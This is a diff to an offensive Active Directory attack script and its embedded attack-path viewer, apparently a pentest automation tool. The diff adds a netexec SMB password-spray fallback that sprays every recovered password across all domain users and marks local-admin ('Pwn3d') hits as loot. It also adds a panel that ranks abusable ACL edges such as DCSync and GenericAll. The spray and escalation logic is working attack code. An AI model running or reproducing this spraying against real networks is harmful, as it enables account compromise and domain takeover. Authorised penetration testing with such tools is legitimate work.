@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.1.0"
+readonly VERSION="1.2.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -275,7 +275,16 @@ check_deps() {
     for t in "${opt[@]}"; do
         if have "$t"; then ok "$t"; else warn "$t (optional) not found — that phase will be skipped"; fi
     done
-    if [[ -x "$KERBRUTE_BIN" ]]; then ok "kerbrute -> $KERBRUTE_BIN"; else warn "kerbrute not found at $KERBRUTE_BIN (user enumeration via Kerberos skipped)"; fi
+    # KERBRUTE_BIN may point at a *directory* (some installs) — resolve the real
+    # binary inside it, or fall back to one on PATH. Otherwise every kerbrute
+    # call dies with "is a directory" and spray/userenum silently do nothing.
+    if [[ -d "$KERBRUTE_BIN" ]]; then
+        local _k; _k=$(find "$KERBRUTE_BIN" -maxdepth 1 -type f -iname 'kerbrute*' 2>/dev/null | head -1)
+        [[ -n "$_k" ]] && { chmod +x "$_k" 2>/dev/null; KERBRUTE_BIN="$_k"; }
+    fi
+    [[ ! -f "$KERBRUTE_BIN" ]] && have kerbrute && KERBRUTE_BIN="$(command -v kerbrute)"
+    if _kerbrute_ok; then ok "kerbrute -> $KERBRUTE_BIN"
+    else warn "kerbrute not a runnable binary at $KERBRUTE_BIN → spray falls back to netexec; variant userenum skipped"; fi
     if [[ -f "$WORDLIST" ]]; then ok "password wordlist -> $WORDLIST"; else warn "wordlist $WORDLIST missing (cracking limited)"; fi
 
     [[ "$missing" == "1" ]] && die "Missing required dependencies. Run ./install.sh"
@@ -1582,7 +1591,7 @@ phase_share_loot() {
 VARIANTS_DONE=0
 phase_user_variants() {
     [[ "$VARIANTS_DONE" == "1" || -z "$DOMAIN" || "$CAP_KERBEROS" != "1" ]] && return
-    [[ ! -x "$KERBRUTE_BIN" || ! -s "$OUTDIR/users_all.txt" ]] && return
+    { ! _kerbrute_ok || [[ ! -s "$OUTDIR/users_all.txt" ]]; } && return
     VARIANTS_DONE=1
     section "USERNAME VARIANTS · derive & validate alternate account formats"
 
@@ -1620,19 +1629,43 @@ phase_user_variants() {
 #  PASSWORD SPRAY  —  spray every recovered password across all known users
 #  (this is what turns a single cracked file/hash into domain-wide pivots)
 # ===========================================================================
-# Spray a single password across all users and queue any valid hit
+# True only when KERBRUTE_BIN is a real, runnable binary (NOT a directory —
+# some installs leave /opt/kerbrute as a folder, and `-x` is true on dirs).
+_kerbrute_ok() { [[ -n "$KERBRUTE_BIN" && -f "$KERBRUTE_BIN" && -x "$KERBRUTE_BIN" ]]; }
+
+# Spray a single password across all users and queue any valid hit.
+# Uses kerbrute when available; otherwise falls back to netexec (always present),
+# so a recovered/harvested password is ALWAYS sprayed → pivots even w/o kerbrute.
 _spray_one() {
-    local pw="$1"
-    "$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
-        | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)' | while read -r u; do
-            loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
-            note_cred_source "${u}:${pw}" "password spray"
-            queue_cred "$u" "$pw" ""
-        done
+    local pw="$1" u
+    if _kerbrute_ok; then
+        "$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
+            | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)' | while read -r u; do
+                loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
+                note_cred_source "${u}:${pw}" "password spray (kerbrute)"
+                queue_cred "$u" "$pw" ""
+            done
+    else
+        # netexec fallback: spray this one password across every user over SMB.
+        # Use Kerberos (-k) + FQDN when in Kerberos mode — many DCs disable NTLM
+        # (STATUS_NOT_SUPPORTED), and Kerberos spray succeeds where NTLM can't.
+        local kflag=(); [[ "$KERBEROS" == "1" ]] && kflag=(-k)
+        $NXC smb "$DCT" -u "$OUTDIR/users_all.txt" -p "$pw" "${kflag[@]}" --continue-on-success 2>&1 \
+            | tee -a "$LOGFILE" | grep -iE '\[\+\]' | while IFS= read -r line; do
+                u=$(echo "$line" | grep -oP '\\\K[^\\:]+(?=:)' | head -1)
+                [[ -z "$u" ]] && continue
+                loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
+                note_cred_source "${u}:${pw}" "password spray (nxc)"
+                echo "$line" | grep -qi 'Pwn3d' && loot "  ↳ ${u} is LOCAL ADMIN where sprayed"
+                queue_cred "$u" "$pw" ""
+            done
+    fi
 }
 
 phase_password_spray() {
-    [[ "$CAP_KERBEROS" != "1" || ! -x "$KERBRUTE_BIN" || ! -s "$OUTDIR/users_all.txt" ]] && return
+    [[ ! -s "$OUTDIR/users_all.txt" ]] && return
+    # need a spray method: kerbrute, or netexec over SMB
+    { ! _kerbrute_ok && [[ "$CAP_SMB" != "1" ]]; } && return
     local pw new=0
     for pw in "${!FOUND_SECRETS[@]}"; do [[ -z "${SPRAYED[$pw]:-}" ]] && new=1; done
 
@@ -1642,8 +1675,8 @@ phase_password_spray() {
         for pw in "${!FOUND_SECRETS[@]}"; do
             [[ -n "${SPRAYED[$pw]:-}" ]] && continue
             SPRAYED["$pw"]=1
-            subsection "Spraying a recovered password against $(wc -l <"$OUTDIR/users_all.txt") users"
-            run "$KERBRUTE_BIN passwordspray -d $DOMAIN --dc $DC_IP users_all.txt '<secret>'"
+            subsection "Spraying a recovered password against $(wc -l <"$OUTDIR/users_all.txt") users ($(_kerbrute_ok && echo kerbrute || echo netexec))"
+            run "spray '<secret>' × users_all.txt"
             _spray_one "$pw"
         done
     fi
@@ -1658,7 +1691,7 @@ phase_password_spray() {
             [[ -z "$pw" || -n "${SPRAYED[$pw]:-}" ]] && continue
             SPRAYED["$pw"]=1; i=$((i+1))
             subsection "[$i/$cap] Spraying '$pw'"
-            run "$KERBRUTE_BIN passwordspray -d $DOMAIN --dc $DC_IP users_all.txt '$pw'"
+            run "spray '$pw' × users_all.txt"
             _spray_one "$pw"
         done <"$DOMAIN_WL"
         info "Generated spray capped at $cap candidates to protect accounts (raise manually if policy allows)"
@@ -1789,6 +1822,33 @@ HTML_TEMPLATE = r'''<!doctype html>
   #search .ico{font-size:13px;color:var(--muted)}
   #search #reset{cursor:pointer;color:var(--muted);font-size:16px;padding:2px 7px;border-radius:8px;transition:.15s;user-select:none}
   #search #reset:hover{background:rgba(255,255,255,.08);color:#7dffc4}
+  #results{position:fixed;top:62px;right:20px;z-index:6;width:262px;max-height:320px;overflow-y:auto;display:none;
+    background:var(--glass);backdrop-filter:blur(14px);border:1px solid var(--line);border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,.45)}
+  #results.show{display:block}
+  #results .r{padding:8px 12px;font-size:12.5px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.04);display:flex;align-items:center;gap:8px}
+  #results .r:hover,#results .r.sel{background:rgba(125,255,196,.10)}
+  #results .r .d{width:9px;height:9px;border-radius:50%;flex:0 0 auto;box-shadow:0 0 8px currentColor}
+  #results .r small{color:var(--muted);margin-left:auto}
+  #dock{position:fixed;top:74px;left:20px;z-index:5;display:flex;flex-direction:column;gap:8px}
+  .tab{cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;color:var(--ink);text-align:left;
+    background:var(--glass);backdrop-filter:blur(14px);border:1px solid var(--line);border-radius:11px;padding:9px 13px;
+    box-shadow:0 8px 26px rgba(0,0,0,.4);transition:.15s}
+  .tab:hover{border-color:rgba(125,255,196,.45);color:#9bf3cf}
+  .tab.on{border-color:rgba(255,45,109,.6);color:#ff8fb0}
+  #findings{position:fixed;top:74px;left:170px;z-index:6;width:340px;max-height:calc(100% - 150px);
+    display:none;flex-direction:column;overflow:hidden}
+  #findings.show{display:flex}
+  #findings .fhead{display:flex;align-items:center;justify-content:space-between;padding:13px 15px;border-bottom:1px solid var(--line);font-weight:700;font-size:13px}
+  #findings .fx{cursor:pointer;color:var(--muted);font-size:18px;line-height:1}
+  #findings .fx:hover{color:#fff}
+  #findings #ffilter{margin:10px 12px;background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:9px;color:var(--ink);padding:7px 11px;font-size:12px;outline:none}
+  #findings .flist{overflow-y:auto;padding:0 8px 12px}
+  #findings .fi{padding:9px 11px;border-radius:9px;cursor:pointer;font-size:12px;margin:3px 0;border:1px solid transparent;transition:.12s}
+  #findings .fi:hover{background:rgba(255,255,255,.05);border-color:var(--line)}
+  #findings .fi .rt{color:#ff8fb0;font-weight:700}
+  #findings .fi .src{color:#cfe8ff}.fi .dst{color:#ffd24a}
+  #findings .fg{font-size:10px;letter-spacing:1px;text-transform:uppercase;color:#7dffc4;margin:12px 6px 4px;font-weight:700}
+  #findings .flist::-webkit-scrollbar{width:8px}#findings .flist::-webkit-scrollbar-thumb{background:rgba(255,255,255,.12);border-radius:8px}
   #legend{position:fixed;bottom:18px;left:20px;z-index:5;padding:12px 14px;font-size:12px}
   #legend .row{display:flex;align-items:center;gap:8px;margin:5px 0;color:var(--muted)}
   #legend .dot{width:11px;height:11px;border-radius:50%;box-shadow:0 0 10px currentColor}
@@ -1849,9 +1909,21 @@ HTML_TEMPLATE = r'''<!doctype html>
 </div>
 <div id="search" class="glass">
   <span class="ico">&#128269;</span>
-  <input id="q" placeholder="Search any node… (Enter)" autocomplete="off" spellcheck="false">
+  <input id="q" placeholder="Search any node…" autocomplete="off" spellcheck="false">
   <span id="reset" title="Reset to attack-path view">&#8635;</span>
 </div>
+<div id="results"></div>
+
+<div id="dock">
+  <button id="btnFind" class="tab" title="Who can abuse what">&#9876; Attack paths</button>
+  <button id="btnUsers" class="tab" title="All users">&#128100; Users</button>
+</div>
+<div id="findings" class="glass">
+  <div class="fhead"><span id="findTitle">Attack paths</span><span class="fx" id="findClose">&times;</span></div>
+  <input id="ffilter" placeholder="filter…" autocomplete="off" spellcheck="false">
+  <div class="flist" id="flist"></div>
+</div>
+
 <div id="legend" class="glass">
   <div class="row"><span class="dot" style="color:var(--user)"></span>User</div>
   <div class="row"><span class="dot" style="color:var(--group)"></span>Group</div>
@@ -1897,8 +1969,15 @@ N.forEach((n,i)=>{n._i=i; n.r=(n.type==="Domain"?14:n.hv?10:7)+Math.min(deg[i]*0
 // Showing every node is noise; we render only what matters and let the user
 // expand (click) or search to pull in the rest on demand.
 const vis=new Set();
-N.forEach((n,i)=>{ if(n.owned||n.hv||n.p) vis.add(i); });
-if(vis.size<2){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,25).forEach(i=>vis.add(i)); }
+// Focus = what you own + the nodes that actually sit on an attack path to a
+// high-value target. Standalone high-value groups with no inbound path are
+// noise, so they're left out of the default view (search/expand to reach them).
+function defaultFocus(){ vis.clear();
+  N.forEach((n,i)=>{ if(n.owned||n.p) vis.add(i); });
+  if(vis.size<2){ N.forEach((n,i)=>{ if(n.hv) vis.add(i); }); }      // no paths → show targets
+  if(vis.size<2){ [...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,20).forEach(i=>vis.add(i)); }
+}
+defaultFocus();
 let visArr=[...vis], VE=[];
 function refresh(){ visArr=[...vis]; const s=new Set();
   visArr.forEach(i=>incE[i].forEach(ei=>{const e=E[ei]; if(vis.has(e.s)&&vis.has(e.t))s.add(ei);}));
@@ -1918,19 +1997,24 @@ function toWorld(px,py){return [(px-tx)/scale,(py-ty)/scale];}
 function step(){
   if(alpha<0.02) return false;
   const arr=visArr, m=arr.length;
+  // more breathing room as the set grows → no clumping
+  const GRAV = 0.0016, LINK = 150 + Math.min(m*1.5, 120);
   for(let a=0;a<m;a++){const A=N[arr[a]]; if(A.fx!=null)continue;
     for(let b=a+1;b<m;b++){const B=N[arr[b]];
-      let dx=A.x-B.x, dy=A.y-B.y, d2=dx*dx+dy*dy+0.01; if(d2>250000)continue;
-      const f=1900/d2, d=Math.sqrt(d2), ux=dx/d, uy=dy/d;
+      let dx=A.x-B.x, dy=A.y-B.y, d2=dx*dx+dy*dy+0.01; if(d2>500000)continue;
+      let d=Math.sqrt(d2), ux=dx/d, uy=dy/d;
+      let f=3400/d2;                                  // base repulsion
+      const mind=A.r+B.r+26;                          // hard anti-overlap
+      if(d<mind) f += (mind-d)*0.9;
       A.vx+=ux*f;A.vy+=uy*f; B.vx-=ux*f;B.vy-=uy*f;}}
   VE.forEach(ei=>{const e=E[ei],A=N[e.s],B=N[e.t]; let dx=B.x-A.x,dy=B.y-A.y;
-    let d=Math.sqrt(dx*dx+dy*dy)||1; const f=(d-115)*0.02, ux=dx/d, uy=dy/d;
+    let d=Math.sqrt(dx*dx+dy*dy)||1; const f=(d-LINK)*0.018, ux=dx/d, uy=dy/d;
     A.vx+=ux*f;A.vy+=uy*f; B.vx-=ux*f;B.vy-=uy*f;});
   let mx=0;
   arr.forEach(i=>{const n=N[i];
-    n.vx+=-n.x*0.003; n.vy+=-n.y*0.003;            // gravity → compact, no drift
+    n.vx+=-n.x*GRAV; n.vy+=-n.y*GRAV;                // gentle centering, no drift
     if(n.fx!=null){n.x=n.fx;n.y=n.fy;n.vx=n.vy=0;return;}
-    n.vx*=0.82; n.vy*=0.82;
+    n.vx*=0.84; n.vy*=0.84;
     if(n.vx>50)n.vx=50; else if(n.vx<-50)n.vx=-50;  // clamp → never explodes
     if(n.vy>50)n.vy=50; else if(n.vy<-50)n.vy=-50;
     n.x+=n.vx*alpha; n.y+=n.vy*alpha; mx=Math.max(mx,Math.abs(n.vx)+Math.abs(n.vy));});
@@ -2096,26 +2180,81 @@ function copy(t){navigator.clipboard&&navigator.clipboard.writeText(t);const e=d
   e.classList.add("show");setTimeout(()=>e.classList.remove("show"),1100);}
 document.getElementById("pclose").addEventListener("click",()=>select(-1));
 
-// ---- search across ALL nodes; bring the match (and its neighbours) into view
-const q=document.getElementById("q");
-function doSearch(){const v=q.value.toLowerCase().trim(); if(!v)return; let best=-1;
-  for(let i=0;i<N.length;i++){if((N[i].label||"").toLowerCase()===v){best=i;break;}}
-  if(best<0)for(let i=0;i<N.length;i++){if((N[i].label||"").toLowerCase().includes(v)){best=i;break;}}
-  if(best>=0){expand(best); scale=1.25; tx=W/2-N[best].x*scale; ty=Hh/2-N[best].y*scale; select(best);}}
-q.addEventListener("keydown",ev=>{if(ev.key==="Enter")doSearch();});
-q.addEventListener("input",ev=>{if(ev.target.value.length>2)doSearch();});
+// ---- bring a node (or an edge's two ends) into view + select ----
+function recenter(cx,cy){ scale=Math.max(scale,1.1); tx=W/2-cx*scale; ty=Hh/2-cy*scale; }
+function focusNode(i){ vis.add(i); nb[i].forEach(j=>vis.add(j)); refresh(); recenter(N[i].x,N[i].y); select(i); reheat(); }
+function focusEdge(s,t){ vis.add(s); vis.add(t); nb[s].forEach(j=>vis.add(j)); refresh();
+  recenter((N[s].x+N[t].x)/2,(N[s].y+N[t].y)/2); select(s); reheat(); }
+
+// ---- search across ALL nodes with a live results dropdown ----
+const q=document.getElementById("q"), results=document.getElementById("results");
+let matches=[], rsel=-1;
+function renderResults(){
+  if(!matches.length){results.classList.remove("show");results.innerHTML="";return;}
+  results.innerHTML=matches.slice(0,40).map((i,k)=>{const n=N[i],c=COLORS[n.type]||COLORS.Base;
+    const m=(n.owned?"☠ ":"")+(n.hv?"★ ":"");
+    return "<div class='r"+(k===rsel?" sel":"")+"' data-i='"+i+"'><span class='d' style='color:"+c+"'></span>"+m+esc(n.label)+"<small>"+n.type+"</small></div>";}).join("");
+  results.classList.add("show");
+  results.querySelectorAll(".r").forEach(el=>el.addEventListener("mousedown",ev=>{ev.preventDefault();pickResult(+el.dataset.i);}));
+}
+function pickResult(i){ matches=[]; results.classList.remove("show"); q.value=N[i].label; focusNode(i); }
+q.addEventListener("input",()=>{const v=q.value.toLowerCase().trim(); rsel=-1;
+  if(!v){matches=[];renderResults();return;}
+  matches=[]; for(let i=0;i<N.length;i++){ if((N[i].label||"").toLowerCase().includes(v)) matches.push(i); }
+  matches.sort((a,b)=>{const A=(N[a].label||"").toLowerCase(),B=(N[b].label||"").toLowerCase();
+    return ((A.startsWith(v)?0:1)-(B.startsWith(v)?0:1)) || (A.length-B.length);});
+  renderResults();});
+q.addEventListener("keydown",ev=>{
+  if(ev.key==="ArrowDown"){rsel=Math.min(rsel+1,matches.length-1);renderResults();ev.preventDefault();}
+  else if(ev.key==="ArrowUp"){rsel=Math.max(rsel-1,0);renderResults();ev.preventDefault();}
+  else if(ev.key==="Enter"){if(matches.length)pickResult(matches[rsel<0?0:rsel]);}
+  else if(ev.key==="Escape"){matches=[];renderResults();q.blur();}});
+document.addEventListener("mousedown",ev=>{if(!ev.target.closest("#search")&&!ev.target.closest("#results"))results.classList.remove("show");});
+
+// ---- findings menu: who can abuse what (+ all users) ----
+const FRANK={dcsync:0,getchangesall:0,getchanges:0,genericall:1,writedacl:2,writeowner:3,owns:3,
+  addkeycredentiallink:4,forcechangepassword:5,allextendedrights:6,writespn:7,addspn:7,addmember:8,addself:8,
+  allowedtoact:9,allowedtodelegate:9,synclapspassword:10,adminto:20};
+const FA=(()=>{const o=[];E.forEach((e,i)=>{if(key(e.l) in ABUSE)o.push(i);});
+  o.sort((a,b)=>((FRANK[key(E[a].l)]??50)-(FRANK[key(E[b].l)]??50))||E[a].l.localeCompare(E[b].l));return o;})();
+const findings=document.getElementById("findings"), flist=document.getElementById("flist");
+const btnFind=document.getElementById("btnFind"), btnUsers=document.getElementById("btnUsers");
+let fmode="";
+function buildFindings(f){f=(f||"").toLowerCase();let h="",last="";
+  FA.forEach(ei=>{const e=E[ei],s=N[e.s],t=N[e.t];
+    if(f && !(s.label+" "+e.l+" "+t.label).toLowerCase().includes(f))return;
+    if(e.l!==last){h+="<div class='fg'>"+esc(e.l)+"</div>";last=e.l;}
+    h+="<div class='fi' data-s='"+e.s+"' data-t='"+e.t+"'>"+(s.owned?"☠ ":"")+"<span class='src'>"+esc(short(s.label))+"</span> <span class='rt'>&rarr;</span> <span class='dst'>"+esc(short(t.label))+"</span></div>";});
+  flist.innerHTML=h||"<div class='fi' style='color:#9aa7b8'>No abusable ACL edges in this dataset.</div>";
+  flist.querySelectorAll(".fi[data-s]").forEach(el=>el.addEventListener("click",()=>focusEdge(+el.dataset.s,+el.dataset.t)));}
+function buildUsers(f){f=(f||"").toLowerCase();
+  const us=[...N.keys()].filter(i=>N[i].type==="User").sort((a,b)=>(N[a].label||"").localeCompare(N[b].label||""));
+  let h=""; us.forEach(i=>{const n=N[i]; if(f && !(n.label||"").toLowerCase().includes(f))return;
+    h+="<div class='fi' data-i='"+i+"'>"+(n.owned?"<span style='color:#ff5b5b'>☠ </span>":"")+(n.hv?"<span style='color:#ffd24a'>★ </span>":"")+"<span class='src'>"+esc(n.label)+"</span></div>";});
+  flist.innerHTML=h||"<div class='fi' style='color:#9aa7b8'>No users.</div>";
+  flist.querySelectorAll(".fi[data-i]").forEach(el=>el.addEventListener("click",()=>focusNode(+el.dataset.i)));}
+function openFindings(mode){ if(fmode===mode){closeFindings();return;}
+  fmode=mode; findings.classList.add("show");
+  btnFind.classList.toggle("on",mode==="find"); btnUsers.classList.toggle("on",mode==="users");
+  const nUsers=N.filter(n=>n.type==="User").length;
+  document.getElementById("findTitle").textContent = mode==="find"?("Abusable ACLs ("+FA.length+")"):("All users ("+nUsers+")");
+  document.getElementById("ffilter").value="";
+  (mode==="find"?buildFindings:buildUsers)("");}
+function closeFindings(){fmode="";findings.classList.remove("show");btnFind.classList.remove("on");btnUsers.classList.remove("on");}
+btnFind.addEventListener("click",()=>openFindings("find"));
+btnUsers.addEventListener("click",()=>openFindings("users"));
+document.getElementById("findClose").addEventListener("click",closeFindings);
+document.getElementById("ffilter").addEventListener("input",e=>{(fmode==="find"?buildFindings:buildUsers)(e.target.value);});
 
 // ---- warm up the layout synchronously, then fit (deterministic first paint)
-function warmup(iters){ alpha=1; for(let k=0;k<(iters||320);k++) step(); fit(); fitted=true; requestDraw(); }
+function warmup(iters){ alpha=1; for(let k=0;k<(iters||420);k++) step(); fit(); fitted=true; requestDraw(); }
 
 // ---- reset to the focused starting view ----
 const rb=document.getElementById("reset");
-if(rb) rb.addEventListener("click",()=>{vis.clear();
-  N.forEach((n,i)=>{if(n.owned||n.hv||n.p)vis.add(i);});
-  if(vis.size<2)[...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,25).forEach(i=>vis.add(i));
-  N.forEach(n=>{const a=Math.random()*6.28,rad=120+Math.random()*240;n.x=Math.cos(a)*rad;n.y=Math.sin(a)*rad;n.vx=n.vy=0;n.fx=n.fy=null;});
-  refresh(); select(-1); q.value=""; warmup();});
-addEventListener("keydown",ev=>{if(ev.key==="Escape")select(-1);});
+if(rb) rb.addEventListener("click",()=>{ defaultFocus();
+  N.forEach(n=>{const a=Math.random()*6.28,rad=160+Math.random()*300;n.x=Math.cos(a)*rad;n.y=Math.sin(a)*rad;n.vx=n.vy=0;n.fx=n.fy=null;});
+  refresh(); select(-1); q.value=""; matches=[]; renderResults(); warmup();});
+addEventListener("keydown",ev=>{if(ev.key==="Escape"){select(-1);closeFindings();}});
 
 // ---- boot ----
 resize(); refresh(); warmup();
